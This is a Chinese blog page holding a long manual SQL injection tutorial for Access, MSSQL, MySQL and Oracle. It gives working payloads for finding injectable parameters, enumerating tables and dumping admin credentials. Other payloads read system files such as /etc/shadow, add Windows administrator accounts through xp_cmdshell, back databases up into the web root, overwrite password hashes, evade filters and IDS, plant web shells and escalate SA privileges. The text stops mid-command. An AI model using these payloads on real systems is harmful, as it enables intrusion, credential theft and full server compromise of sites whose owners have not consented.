<!DOCTYPE HTML>
<html class="no-js" lang="zh-CN">
<!--
//                            _ooOoo_
//                           o8888888o
//                           88" . "88
//                           (| -_- |)
//                            O\ = /O
//                        ____/`---'\____
//                      .   ' \\| |// `.
//                       / \\||| : |||// \
//                     / _||||| -:- |||||- \
//                       | | \\\ - /// | |
//                     | \_| ''\---/'' | |
//                      \ .-\__ `-` ___/-. /
//                   ___`. .' /--.--\ `. . __
//                ."" '< `.___\_<|>_/___.' >'"".
//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
//                 \ \ `-. \_ __\ /__ _/ .-` / /
//         ======`-.____`-.___\_____/___.-`____.-'======
//                            `=---='
//                 拦截插件累计拦截逗比攻击"1381438"次！
//         .............................................
//                  佛祖保佑             永无BUG
//          佛曰:
//                  写字楼里写字间，写字间里程序员；
//                  程序人员写程序，又拿程序换酒钱。
//                  酒醒只在网上坐，酒醉还来网下眠；
//                  酒醉酒醒日复日，网上网下年复年。
//                  但愿老死电脑间，不愿鞠躬老板前；
//                  奔驰宝马贵者趣，公交自行程序员。
//                  别人笑我忒疯癫，我笑自己命太贱；
//                  不见满街漂亮妹，哪个归得程序员？
-->
<head>
    <!--[if lte IE 9]>
<meta http-equiv="refresh" content="0;url=https://www.linuxboy.top/warn.html">
<![endif]-->
<meta charset="utf-8">

<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">

<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
<meta http-equiv="mobile-agent" content="format=html5; url=https://www.linuxboy.top">
<meta name="author" content="LIUNX男孩">
<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="/css/SimpleStyle.min.css">

<link rel="shortcut icon" href="/images/favicon.png">


<title>手工注入 - LIUNX男孩</title>

<meta name="keywords" content="linux，python等">

<meta name="description " content="null">
</head>
<body>
<div id="nav">
    <nav class="nav-menu">
        <a class="site-name current" href="/" title="linux">linux</a>
        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
        <!-- custom single page of menus -->
        
        
        <a href="/help" title="帮助">
            <i class="fa fa-question-circle"></i>
            <span>帮助</span>
        </a>
        
    </nav>
</div>

<div class="nav-user">
    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
</div>

<div id="wrapper" class="clearfix">
    <div id="body">
        <div class="main" id="main">
            <div id="cover">
    <div class="cover-img"></div>
    <div class="cover-info">
        
        <h1 class="cover-siteName">Linux男孩</h1>
        <h3 class="cover-siteTitle">做运维，享生活</h3>
        <p class="cover-siteDesc">一个喜欢linux安全的IT博客</p>
        <div class="cover-sns">
            
            <div class="btn btn-instagram">
                <a href="https://www.linuxboy.top" target="_blank" title="instagram" ref="friend">
                    <i class="fa fa-instagram"></i>
                </a>
            </div>
            
            <div class="btn btn-github">
                <a href="https://github.com/5279314" target="_blank" title="github" ref="friend">
                    <i class="fa fa-github"></i>
                </a>
            </div>
            
            <div class="btn btn-weibo">
                <a href="https://weibo.com/u/6123670411" target="_blank" title="weibo" ref="friend">
                    <i class="fa fa-weibo"></i>
                </a>
            </div>
            
        </div>
    </div>
</div>
            <div class="page-title">
    <ul>
        <li><a href="/">最新</a></li>
        
            
                <li class="">
                    <a href="/categories/linuxboy" data-name="Linux">Linux</a>
                </li>
            
                <li class="">
                    <a href="/categories/python" data-name="Python">Python</a>
                </li>
            
                <li class="">
                    <a href="/categories/security" data-name="安全">安全</a>
                </li>
            
                <li class="">
                    <a href="/categories/other" data-name="其他">其他</a>
                </li>
            
        
        <li class="page-search">
    <form id="search" class="search-form">
        <label for="s" class="sr-only">Input Search key Words Here</label>
        <input class="search-field" type="text" name="s" class="text" placeholder="Input Search key Words Here" />
        <button type="submit" class="search-form-submit" title="Search"><i class="fa fa-search"></i></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
</li>

    </ul>
</div>
<div class="main-inner">
    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
        <div class="post-header">
            <div class="post-author clearfix">
                <a class="avatar fleft" href="https://www.linuxboy.top" target="_blank">
                    <img width="48" src="/images/favicon.png" alt="avatar"/>
                </a>
                <p><span class="label">作者</span>
                    <a href="https://www.linuxboy.top" target="_blank">王先森</a>
                    <span title="最后编辑于2018-08-09">2018-08-09</span>
                </p>
                <p>一个热爱linux「伪文人」</p>
            </div>
            <h2 class="post-title">手工注入</h2>
            <div class="post-meta">
                本文总共14897个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
            </div>
        </div>
        <div class="post-content markdown-body">
            <link rel="stylesheet" type="text/css" href="/assets/css/DPlayer.min.css"><script src="/assets/js/DPlayer.min.js"> </script><script src="/assets/js/APlayer.min.js"> </script><pre><code>手工注入总结
</code></pre><p>注意，是注入，不单单是SQL，还牵扯到了一些Oracle，嗯，asp、PHP都涉及到了，还有绕过防注入、偏移注射、跨库查询，甚至在后边还说的有提权，可能你在看这篇文章的前一部分的时候会觉得很多你都看过了，但是，不要着急，后面的你应该是没看过的，嘿嘿，整合了多家资源，也加了一点点（注意是一点点，跟这些牛们不敢相提并论的）自己的想法，总体感觉，还可以吧。另外，也奉劝那些整天拿着啊D、明小子、NBSI狂扫的同学，多学点基础不会对你有坏处，如果底子不好，那以后的路是走不了多远的，按某牛的话说，撑死了也就是个ScriptBoy，成不了大气候，所以，还是静下心来专心做学问比较好。<br><a id="more"></a><br>一、判断是否可以注入：</p>
<ol>
<li>单引号<br>但如果单引号测试出错，是可以试试and 1=1的，因为一些对SQL注入有一点了解的程序员认为只要把单引号过滤掉就可以了</li>
<li>传入参数为数字型时：<br>and 1=1<br>and 1=2<br>可以注入的提示：<br>BOF或EOF，程序未做任何判断<br>提示找不到记录，判断了rs.eof<br>显示内容为空，程序加了on error resume next<br>不可注入的提示：<br>类型转换时出错<br>其他自定义的出错提示<br>注：其实只要两次返回页面不同，基本上都是可以注入的。</li>
<li>传入参数不为数字型时，需要变动一下<br>比如：<br>asp?id=aeo’ and ‘1’=’1<br>asp?id=aeo’ and ‘1’=’2<br>二、判断数据库类型<br>1.And user&gt;0<br>user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。拿一个 nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错，SQLServer的出错提示是：将nvarchar值 ”abc” 转换数据类型为 int 的列时发生语法错误，abc正是变量user的值，这样，不废吹灰之力就拿到了数据库的用户名。<br>这样就可以判断是否为SQLServer数据库或Access,前提是IIS错误提示未关闭，并且SQL返回错误提示<br>2.sysobjects和msysobjects<br>Sysobjects是SQL的内置系统表，在WEB下可以正常读取，msysobjects是Access的内置系统表，在WEB下无权读取。<br>那么就可以输入<br>and (select count(<em>) from sysobjects)&gt;0<br>或<br>and (select count(</em>) from msysobjects)&gt;0<br>这两句随便输入一句即可判断。<br>也可以提交<br>;and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–<br>如果显示正常，说明是SA<br>3.在注入点后加上：<br>;–<br>一个分号两个横线，如果页面返回正常的话，说明数据库是MSSQL，因为在MSSQL数据库里，;和–都是存在的，”;” 用来分离两个语句，而”–”就是注释符，在它后面的语句都不执行，而ACCESS数据库里没有。<br>4.高级数据库类型判断方法<br>某日，发现一目标存在SQL注入，且过滤了select等相关敏感字段，用工具暂无法判断数据库类型。<br>后发现调用某些SQL函数也可判断数据库类型，虽然SQL语句大部分是通用的。但一些内置的函数还是有一定的区别。<br>len和length<br>在mssql和MySQL以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。<br>换句话说。<br>当你使用and len(‘a’)=1的时候，返回正常页面时，可以推断当前的数据库类型可能是mssql，或mysql，或是db2。反之则可能会是oracle和informix。<br>@@version和version()<br>在mysql内，可以用@@version或是version()来返回当前的版本信息。但无法判断是mysql还是mssql时，可以用version()函数来构造判断。<br>换句话说：<br>version()&gt;1 返回与@@version&gt;1 相同页面时，则可能是mysql。如果出现提示version()错误时，则可能是mssql。<br>substring和substr<br>在mssql中可以调用substring。oracle则只可调用substr<br>SUBSTRING(‘abc’,1,1)=a 返回成功，刚可能是mssql。使用substr(‘abc’,1,1)=a 返回成功，则可能为oracle<br>5、阿呆的判断数据库的方法<br>原文在阿呆的博客里有<br><a href="http://www.xxxx.com/infoshow.php?id=251/**//*" target="_blank" rel="external">http://www.xxxx.com/infoshow.php?id=251/**//*</a><br>提交这样的地址，返回正常，说明是MYSQL<br>阿呆是这么说的，我没弄明白原理</li>
</ol>
<p>三、猜表名<br>1.And (Select Count(<em>) from Admin)&gt;=0<br>如果页面正确，则admin表存在，反之则不存在<br>2.and exists (select </em> from admin)<br>如果页面正确，则admin表存在，反之则不存在</p>
<ol>
<li>and 0&lt;&gt;(select count(*) from admin)<br>如果页面正确，则admin表存在，反之则不存在</li>
<li>and (select count(*) from admin)&gt;2<br>判断该表内有几条记录，也就是判断有几个管理员<br>四、猜字段</li>
<li>And (Select Count(字段名) from Admin)&gt;=0<br>如果页面正确，则admin表中的相应字段存在，反之则不存在<br>2.and exists (select 字段名 from admin)<br>如果页面正确，则admin表中的相应字段存在，反之则不存在</li>
<li>and 1=(select count(<em>) from admin where len(username)&gt;0)<br>如果页面正确，则admin表中的相应字段存在，反之则不存在<br>五、猜内容<br>可以分为两种情况，一种是支持联合查询，另外是不支持联合查询<br>阿呆的判断是否支持联合查询的方法：<br><a href="http://www.xxxx.com/infoshow.php?id=251/**/and/**/ord(mid(version(),1,1))&gt;51/" target="_blank" rel="external">http://www.xxxx.com/infoshow.php?id=251/**/and/**/ord(mid(version(),1,1))&gt;51/</a></em><br>页面正常则说明支持<br>在mysql中 有很多的注射能用到的函数 比如 user()   database()   version() 分别用来查看当前数据库连接的用户名，数据库名称 以及mysql的版本，这些函数可以直接用于显示位里，比如：<br><a href="http://www.xxxx.com/infoshow.php?id=251/**/and/**/1=2%20union%20select%201,user(),3,database(),5,6,7,8,9,10,11,12,13,14,15,16,17,18/*" target="_blank" rel="external">http://www.xxxx.com/infoshow.php?id=251/**/and/**/1=2%20union%20select%201,user(),3,database(),5,6,7,8,9,10,11,12,13,14,15,16,17,18/*</a><br>这样就返回了相应的信息。<br>那么可能就有人会说，我要他这几个函数得到的信息怎么利用呢？下面是答案：<br>如果当前连接数据库的用户是 root的话 可以尝试使用 loadfile()函数来查看文件内容，不过前提是要知道文件的绝对路径，至于绝对路径需要我们通过不同的手段来拿到。<br>穿插一点：php+mysql注入中load_file()函数的应用<br>注入的过程中 如果当前数据库连接用户为root或者具有root权限就可以尝试使用这个函数来读取文件 比如在Linux下我们可以读取 /etc/passwd 和/etc/shadow来暴力破解linux密码<br>在windows下 我们可以读取 一些常见的文件以及敏感的地方比如 serv-u的配置文件 my.ini等等<br>刚才我们已经爆出了当前数据库连接的用户名root@localhost<br>查看下 c:\boot.ini 这里假设是windows系统 其实就是windows系统<br>格式是这样的 load_file(0x+文件绝对路径的16进制)<br>我们先用工具转换下 刚才的断了 我们继续 我一直用这个工具转换<br>c:\boot.ini转换成16进制是633A5C626F6F742E696E69<br>我们load_file()看看,输入<br>union+select+1,2,3,load_file(0x633A5C626F6F742E696E69),5,6,7,8,9,10，如图十三<br>额，说一下，这个图我给和谐掉了，因为这篇文章都是文字，这里出来一个图，发的时候不好发，所以就给和谐了，但是不影响理解的，只是看不到实效罢了，我们完全可以在自己的实践中来运用。<br>可以看出来，boot.ini已经被读出来了，上次问YoCo，他说是可以加载任意文件的，只要你知道路径，记得原来看过一个专门说load_file的文章，忘了扔哪去了，这次整理资料也找不到了，叹一个，YoCo你要看到这篇文章的话帮忙想一下，我记得好像是你给我的文章地址…<br>还有个技巧，在WIN下load_file(‘C:\WINDOWS\system32\inetsrv\MetaBase.xml’) 可了解IIS配置 在无法获得路径的情况下是个不错的方法</li>
</ol>
<p>1、支持联合查询<br>A、判断该页面字段数，并得到显示位<br>有两种方法，一种是：<br>And 1=2 union select 1,2,3,4…<br>直到页面显示正确<br>需要注意的是，这种方法有时需要将这些数字换成null<br>另一种是用order by<br>Order by 10<br>显示正确则字段数大于10，反之则不大于<br>B、爆出用户名和密码<br>And 1=2 union select 1,2,3,4,username,5,6,7 from admin<br>这样就直接爆出了用户名，然后再爆出密码即可。<br>需要注意的是，如果是PHP注入，则需要将上面的语句换成：<br>And 1=2+union+select+1,2,3,4,concat(username),5,6,7+from+admin<br>上面的语句也可以换成：<br>And 1=2/<strong>/union/</strong>/select/<strong>/1,2,3,4,concat(username),5,6,7/</strong>/from/<em>*/admin/</em><br>那么，我们这个方法是取的数据库中的第一列的数据来输出的，那么，如果这个网站有多个管理员，我们想得到第二个管理员的信息，这时候该怎么办呢？<br>这个时候我们可以使用判断语句来查询不同的管理员的用户名和密码，在管理员表中一般都有个id字段，我们可以用这个字段的值来查询不同的管理员信息，一般的都是 从1开始的，（当然，也存在不是从一开始的情况，那个时候就需要我们慢慢猜一下了）<br>and+1=2+union+select+1,username,3,password,5,6,7,8,9,10+from+users+where+id=2<br>这样，第一列的管理员的id是1的话，我们让id等于2，这样就取出了第二个管理员的信息。<br>2、不支持联合查询<br>这样的话就只好一位一位的猜了<br>首先，测试字段内记录的长度<br>and (select top 1 len(username) from Admin)&gt;0<br>拿出username中的第一条记录，判断长度是否大于0，大于，则显示正确，反之，不大于<br>也可以and 1=(select count(*) from admin where len(username)=5)<br>显示正常说明username的内容等于5，一般为admin，换掉5的值即可判断出该字段的长度。<br>取得长度后，用mid(username,N,1)截取第N位字符，再asc(mid(username,N,1))得到ASCII码，如<br>and (select top 1 asc(mid(username,1,1)) from Admin)&gt;0<br>拿出username中的第一条记录中的第一个字符的ASC码，并判断其值是否大于0，改变0值即可判断出该字符的ASC码大小，然后再转换得到真实字符。<br>英文和数字的ASCII码在1-128之间。<br>中文处理办法：<br>Access中，中文的ASCII码可能会出现负数，取出该负数后用abs()取绝对值，汉字字符不变。<br>SQLServer中，中文的ASCII为正数，但由于是UNICODE的双位编码，不能用函数ascii()取得ASCII码，必须用函数unicode ()返回unicode值，再用nchar函数取得对应的中文字符。<br>了解了上面的两点后，是不是觉得中文猜解其实也跟英文差不多呢？除了使用的函数要注意、猜解范围大一点外，方法是没什么两样的。</p>
<p>六、SQL的一些函数<br>有SQL语言基础的人，在ＳＱＬ注入的时候成功率比不熟悉的人高很多。我们有必要提高一下自己的SQL水平，特别是一些常用的函数及命令。<br>Access：asc(字符)     SQLServer：unicode(字符)<br>作用：返回某字符的ASCII码<br>Access：chr(数字)     SQLServer：nchar(数字)<br>作用：与asc相反，根据ASCII码返回字符<br>Access：mid(字符串,N,L)    SQLServer：substring(字符串,N,L)<br>作用：返回字符串从N个字符起长度为L的子字符串，即N到N+L之间的字符串<br>Access：abc(数字)     SQLServer：abc (数字)<br>作用：返回数字的绝对值（在猜解汉字的时候会用到）<br>Access：A between B And C     SQLServer：A between B And C<br>作用：判断A是否界于B与C之间</p>
<p>七、SQL高级注入<br>SQLServer是一个功能强大的数据库系统，与操作系统也有紧密的联系，这给开发者带来了很大的方便，但另一方面，也为注入者提供了一个跳板，我们先来看看几个具体的例子：<br>① <a href="http://Site/url.asp?id=1;exec" target="_blank" rel="external">http://Site/url.asp?id=1;exec</a> master..xp_cmdshell “net user name password /add”–<br>分号;在SQLServer中表示隔开前后两句语句，–表示后面的语句为注释，所以，这句语句在SQLServer中将被分成两句执行，先是Select出ID=1的记录，然后执行存储过程xp_cmdshell，这个存储过程用于调用系统命令，于是，用net命令新建了用户名为name、密码为password的windows的帐号，接着：<br>② <a href="http://Site/url.asp?id=1;exec" target="_blank" rel="external">http://Site/url.asp?id=1;exec</a> master..xp_cmdshell “net localgroup name administrators /add”–<br>将新建的帐号name加入管理员组，不用两分钟，你已经拿到了系统最高权限！当然，这种方法只适用于用sa连接数据库的情况，否则，是没有权限调用xp_cmdshell的。<br>③ <a href="http://Site/url.asp?id=1" target="_blank" rel="external">http://Site/url.asp?id=1</a> ;and db_name()&gt;0<br>前面有个类似的例子and user&gt;0，作用是获取连接用户名，db_name()是另一个系统变量，返回的是连接的数据库名。<br>④ <a href="http://Site/url.asp?id=1;backup" target="_blank" rel="external">http://Site/url.asp?id=1;backup</a> database 数据库名 to disk=’c:\inetpub\wwwroot\1.db’;–<br>这是相当狠的一招，从③拿到的数据库名，加上某些IIS出错暴露出的绝对路径，将数据库备份到Web目录下面，再用HTTP把整个数据库就完完整整的下载回来，所有的管理员及用户密码都一览无遗！在不知道绝对路径的时候，还可以备份到网络地址的方法（如\202.96.xx.xx\Share \1.db），但成功率不高。<br>⑤ <a href="http://Site/url.asp?id=1" target="_blank" rel="external">http://Site/url.asp?id=1</a> ;and (Select Top 1 name from sysobjects where xtype=’U’ and status&gt;0)&gt;0<br>前面说过，sysobjects是SQLServer的系统表，存储着所有的表名、视图、约束及其它对象，xtype=’U’ and status&gt;0，表示用户建立的表名，上面的语句将第一个表名取出，与0比较大小，让报错信息把表名暴露出来。第二、第三个表名怎么获取？还是留给我们聪明的读者思考吧。<br>⑥ <a href="http://Site/url.asp?id=1" target="_blank" rel="external">http://Site/url.asp?id=1</a> ;and (Select Top 1 col_name(object_id(‘表名’),1) from sysobjects)&gt;0<br>从⑤拿到表名后，用object_id(‘表名’)获取表名对应的内部ID，col_name(表名ID,1)代表该表的第1个字段名，将1换成2,3,4…就可以逐个获取所猜解表里面的字段名。<br>⑦asp?id=1;update admin set password= ‘新MD5密码’ where password= ‘旧MD5密码’ –<br>这句更狠，用于解不出MD5的情况，直接把密码给替换掉了，但是只能用于SQL数据库，admin为表名</p>
<p>八、绕过程序限制继续注入<br>1、如where xtype=’U’，字符U对应的ASCII码是85，所以可以用where xtype=char(85)代替；如果字符是中文的，比如where name=’用户’，可以用where name=nchar(29992)+nchar(25143)代替。<br>2、运用编码技术绕过<br>如URLEncode编码，ASCII编码绕过。<br>例如or 1=1即<br>%6f%72%20%31%3d%31<br>而Test也可以为<br>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)<br>3、通过空格绕过<br>如两个空格代替一个空格，用Tab代替空格等，或者删除所有空格，如<br>or’ swords’ =‘swords’，由于mssql的松散性，我们可以把or ‘swords’ 之间的空格去掉，并不影响运行。<br>4、运用字符串判断代替<br>用经典的or 1=1判断绕过,<br>如<br>or ‘swords’ =’swords’<br>这个方法就是网上在讨论的。<br>5、通过类型转换修饰符N绕过<br>可以说这是一个不错的想法，他除了能在某种程度上绕过限制，而且还有别的作用，大家自己好好想想吧。关于利用，<br>如<br>or ‘swords’ = N’ swords’<br>，大写的N告诉mssql server 字符串作为nvarchar类型，它起到类型转换的作用，并不影响注射语句本身，但是可以避过基于知识的模式匹配IDS。<br>6、通过+号拆解字符串绕过<br>效果值得考证，但毕竟是一种方法。如<br>or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ )<br>7、通过LIKE绕过<br>8、<br>以前怎么就没想到呢？<br>如<br>or’swords’ LIKE ‘sw’<br>显然可以很轻松的绕过“=”“&gt;”的限制……<br>8、通过IN绕过<br>与上面的LIKE的思路差不多,<br>如<br>or ‘swords’ IN (‘swords’)<br>9、通过BETWEEN绕过<br>如<br>or ‘swords’ BETWEEN ‘rw’ AND ‘tw’<br>10、通过&gt;或者&lt;绕过<br>or ‘swords’ &gt; ‘sw’<br>or ‘swords’ &lt; ‘tw’<br>or 1&lt;3<br>……<br>11、运用注释语句绕过<br>用/<strong>/代替空格，如：UNION /</strong>/ Select /<strong>/user，pwd，from tbluser<br>用/</strong>/分割敏感词，如：U/<strong>/ NION /</strong>/ SE/<strong>/ LECT /</strong>/user，pwd from tbluser<br>12、用HEX绕过，一般的IDS都无法检测出来<br>0x730079007300610064006D0069006E00 =hex(sysadmin)<br>0x640062005F006F0077006E0065007200 =hex(db_owner)</p>
<p>九、注入经验<br>1.有些人会过滤Select、Update、Delete这些关键字，但偏偏忘记区分大小写，所以大家可以用selecT这样尝试一下。<br>2.在猜不到字段名时，不妨看看网站上的登录表单，一般为了方便起见，字段名都与表单的输入框取相同的名字。<br>3.特别注意：地址栏的+号传入程序后解释为空格，%2B解释为+号，%25解释为%号，具体可以参考URLEncode的相关介绍。<br>4.用Get方法注入时，IIS会记录你所有的提交字符串，对Post方法做则不记录，所以能用Post的网址尽量不用Get。</p>
<ol>
<li>猜解Access时只能用Ascii逐字解码法，SQLServer也可以用这种方法，只需要两者之间的区别即可，但是如果能用SQLServer的报错信息把值暴露出来，那效率和准确率会有极大的提高。<br>十、几个oracle注入的时候需要注意的地方<br>1)OracIe注入的时候，union语句的前后类型必须要匹配，要不然会查询不成功。oracle类型常见的有字符类型、数字类型和日期类型等 一般我们能用来做union查询并显示的是字符类型和数字类型。前面构造的 union select 1,2,3,4,5,6,7,8,9,10,11,1213,14,15,16 这个SQL语句的union后面全部是数字类型，而前面肯定有其它类型，所以是不能查询成功的。oracle并不会自己做数据类型转换，但是oracle中可以用NULL匹配所有的数据类型，所以我们等会可以先全部SeIect NULL，然后再逐一检查union之前所select的类型。<br>2)select语句后面必须要跟表名，要不然也不能查询成功。”seIect 1,2,3 这样的语句在SQL Server和MySQL中是可以成功执行的，但在oracIe中必须在后面加上表名．比如 select 1,2,3 from admin才行。不过这也不是问题。oracle中有个默认谁都有权限的表 dua ．我们可以在select后面加上这个表名。</li>
</ol>
<p>十一、偏移注射<br>关于Union偏移注射这个东西，最早貌似是lake2大黑客提出来的，以前一直当他是鸡肋，没去关注过，直到昨天遇到一个mysql 4.1的点。<br>表，列都猜出来了，就差数据。因为他的参数是按“,”分割的，所以在注射的时候必须避开逗号，这样一来普通的union就用不成了，想暴力猜解也不行，因为substring也得用到逗号。无奈中想起join语句，偏移注射里面有一个很重要的技巧就是用join语句来控制字段数和数据显示的位置。麻烦的地方在于很多时候你根本不知道目标系统的环境，表里到底有多少列，数据类型什么的，怎么把他拼装到凑齐字段数，只能靠乱猜。<br>目标网站order by 7正常，order by 8无返回，那么一共是7个字段，按照通常的做法，应该是先and 1=2 union select 1,2,3,4,5,6,7#来看看情况，这里因为要避开逗号，就必须用到join语句。但是不知道用户表一共有几列，没有关系，我们可以用select <em> from ((select username from users)as a join (select username from users)as b on a.username=b.username)，把select出部分字段的结果集当做一个表，然后来join到一起，这样只要把(select username from users)as a重复7次，就可以把字段补齐。<br>上面的语句在mysql5里面可以正常执行，也可以用到union子句中，可是在mysql4里就报语法错误，看来4.x不支持这么复杂的嵌套。修改了一下：<br>select </em> from users as a join (select id from users) as b on a.id=b.id<br>这样在4.1里可以正常执行，4.0因为不支持子语句，简单的说就是不支持()里带select，所以就木有办法鸟。<br>但是这样又有问题鸟，因为第一个select后面必须跟<em>，否则只会返回第一列。Mysql的join语句默认应该是inner join，也就是内连接，我尝试换成left join或者right join都不行，我记得mysql4应该是支持左连接和右连接的，搞不懂这里为什么行不通。这么一来又必需猜目标表的字段数了，而且目标表的字段数必需＜=语句里select出的字段数才行，也受显示数据字段的制约。好处就是不知道列名也没关系，可以用常数来代替，即select 1,2,3,4,5 union select </em> from users as a join (select 1 from users) as b join (select 1 from users) as c on a.id=1<br>这样就完全避开了“,”，select出来的数据里可能会有很多重复，用distinct关键字过滤掉即可。<br>如果目标表的字段&gt;前面选择的字段也没关系，因为必需保证最前面的字段是<em>，找一个字段少一点的表，即select </em> from news as a join (select username from users) as b，不过这个东西受到扫出来的表名，字段数，显示数据字段的制约，比较鸡肋了。<br>以上语句在mysql里测试成功，如果要在access或者mssql里使用，估计得另外调试。这个跟以前提出来那个偏移注射有些区别，也姑且算另外一种意义上的偏移注射吧。核心思想就是不断的join来补齐字段，从而避开。<br>最郁闷的是，最后竟然是用fckeditor搞定shell的，真没技术含量，一下午白研究了-_-<br>刚才在外面骑车的时候，突然想到，之前的语句select <em> from users as a join (select id from users) as b on a.id=b.id前面必须要用到</em>是因为他并没有把这个select <em> from users as a作为一个整体来解析，而是将users as a跟后面的join到一起了，即select </em> from (users as a join (select id from users) as b on a.id=b.id)，当然前面要用<em>，才能返回子语句里所有的列数了。<br>那么改写成select distinct </em> from (select 1 from users)as a join (select 2 from users)as b即可，然后依次像后面join补齐字段，最后把合适的地方换成用户名密码字段即可。mysql 4.1下测试成功，当然还是需要知道列名，呵呵<br>十二、猜出绝对路径进行差异备份<br>MSSQL数据库，还可以猜解网站存放在服务器中的根目录，通过差异备份备份出一句话，然后通过一句话木马客户端，上传脚本木马<br>如果一个网站注入点是MYSQL数据库，且是DB权限，或者是SA权限，能够列目录，那么就好办了，找到网站的目录，目录通常在D和E盘，备份个小马，上地址访问看看成功没，直接备份大马貌似不行，成功后，再输入大马内容</p>
<p>十三、通过注入点判断服务器的硬盘(分区)是否有访问权<br><a href="http://www.fun***.com/user/wmadown.asp?id=48187，这个是注入点了的。现在我们用" target="_blank" rel="external">http://www.fun***.com/user/wmadown.asp?id=48187，这个是注入点了的。现在我们用</a> SQL查询语句试试，C盘是否有访问权限。<br>语句是：<br>and (select count(<em>) from c:\autoexec.bat.c)&gt;0<br>解释一下原理，其它AC数据库也是可以跨库查询。只要把 from 后的表名改成MDB数据库的硬盘绝对地址，后台加上个“. ”，接上要查的表名。例如，我要查D盘yqf.mdb中的ADMIN表：<br>and (select count(</em>) from d:\yqf.mdb.admin)&gt;0<br>这样的语句，只要知道服务器硬盘其它数据库地址，ACCESS也能跨库查询。只是不知道地址，所以这个无关紧要。<br>and (select count(<em>) from c:\autoexec.bat.c)&gt;0<br>为什么说用这句可以判断是否有硬盘访问权限呢？大家都知道c:\autoexec.bat 是系统里自有的文件 无论哪个系统都有，而大家默认安装WINDOWS也是装在C盘，如果这样找不到文件的话，你可以试试其它盘。<br>现在我们提交：<br>and (select count(</em>) from c:\autoexec.bat.c)&gt;0<br>看到吧“不可识别的数据库格式’c:\AUTOEXEC.BAT’”报错信息，这样表示C盘有访问的权限。因为读到了AUTOEXEC.BAT把autoexec.bat当mdb数据库来处理了，所以就出现这样的错误提示。<br>现在我们用刚传的马去看看，呵，C盘有访问的权限吧。反之，如果没有访问权限，则会提示“c:\autoexec.bat 已被另一种方式打开，或者无权访问。”类似这样的提示，就是无权限访问了。<br>不过 autoexec.bat 可以测试，比如 c:\winnt\system32\cmd.exe，这些系统原有的文件都可以用来试。</p>
<p>十四、sa下的注入提权<br>虽说这年头讨论注射已经有点过时了,何况还是sa,但是在遇到我这种情况时,怕只有对injection研究高深的人才能突破吧…<br>本文讨论仍然是sql_server &amp;Win32下的环境<br>是的,网络上已经发布了不少对于存储扩展应用的文档,但大部分是转载的,真正的原理少只又少<br>比如xp_subdirs 是如何获取目录的,是cracert tables 然后select反馈?<br>比如xp_cmdshell 是如何执行cmdshell的 dbo下的system继承?<br>比如sandboxmode下的net user是如何执行的,vbs调用的Shell()?<br>等等等等~~<br>sa的注射搞不下服务器真有点丢人,前提继承的是system :) ,至于其他牛角尖的环境就留给那些提问者吧<br>好了,说说一些特殊的环境吧<br>我们知道,各扩展存储都有调用他们对应的dll文件,例如: sp_OACreate调用odsole70.dll xp_Cmdshell调用xplog70.dll<br>OK,进入正题:<br>情况1:<br>dll文件被替换(因为dll是存储在sqlserver指定路径中的),比如sp_Oacreate被替换成xpweb70.dll<br>如何测试这种情况呢?可以exec sp_oraceate ‘xxxxxxx’ 提示:找不到sp_oraceate,对应的xx.dll没有此函数之类的<br>解决方法:<br>exec sp_dropextendedproc ‘Sp_OACreate’<br>EXEC sp_addextendedproc Sp_OACreate ,@dllname =’上传dll’<br>情况2:xp_cmdhshell 或oacreate 无法利用时,采用sandboxmode(沙盒模式)<br>沙盒模式是通过access创建vbs 函数来执行shell的<br>具体语法就不说了前提是要能执行xp_regwrite 开启它<br>但这个利用方法有个局限性,它并不是通过cmd 来调用文件执行的,一般情况下是cmd.exe /c net user 这样,而他是net user 为什么呢? 这么理解吧 shell ‘c:\windows\system32\net.exe user’这样明白了吧,他只支持system32下的文件调用<br>而一般的dir ,echo,copy…等等都无法直接利用 可以尝试cmd /c dir….. 这样调用<br>由此引发情况3:<br>cmd,net被禁或更改,这是比较纳闷的问题,而且国内似乎也没有相关的解决办法<br>回到情况二,如上所述sandboxmode能调用system32下的文件,别忘记了有个cacls,有了它,那么网站的权限配置几乎为0了(再次强调,此法必须继承system权限,并且cmdshell等无法利用的情况下)<br>测试方法:Select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database=c:\windows\system32\ias\ias.mdb’,’select shell(“cacls c:\windows\system32\cmd.exe /t /e /c /g system:F”)’); 赋予cmd.exe的system用户所有权限<br>如果cmd被删或者net.exe,net1.exe被禁也可calcs c:\windows\system32\net.exe /t /e /c /g 